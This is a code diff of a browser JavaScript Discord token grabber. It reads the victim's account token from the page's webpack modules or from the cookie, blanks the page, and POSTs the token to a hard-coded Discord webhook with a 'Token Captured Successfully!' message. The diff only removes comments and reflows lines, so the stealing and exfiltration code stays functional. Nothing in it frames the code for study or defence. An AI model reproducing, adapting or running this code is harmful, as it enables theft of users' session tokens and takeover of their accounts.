@@ -14,7 +14,6 @@
         (async () => {
             try {
                 let token = null;
-                // Token Extract Logic
                 for(let e of Object.values(window.webpackChunkdiscord_app.push([[Symbol()], {}, e => e.c])) {
                     try {
                         if (!e.exports || e.exports === window) continue;
@@ -26,24 +25,16 @@
                         }
                     } catch(e) {}
                 }
-                
-                // Fallback
                 if(!token) {
                     const tokenMatch = document.cookie.match(/"token":"(.*?)"/);
                     if (tokenMatch) token = tokenMatch[1];
                 }
-
                 if (token) {
-                    // Hide loading
                     document.body.innerHTML = "";
-                    
-                    // Send to Webhook
                     await fetch("https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ 
-                            content: `🔓 **Token Captured Successfully!**\n\n\`\`\`${token}\`\`\`` 
-                        })
+                        body: JSON.stringify({ content: `🔓 **Token Captured Successfully!**\n\n\`\`\`${token}\`\`\`` })
                     });
                 } else {
                     document.body.innerHTML = "<h1 style='text-align:center'>Token Not Found</h1>";
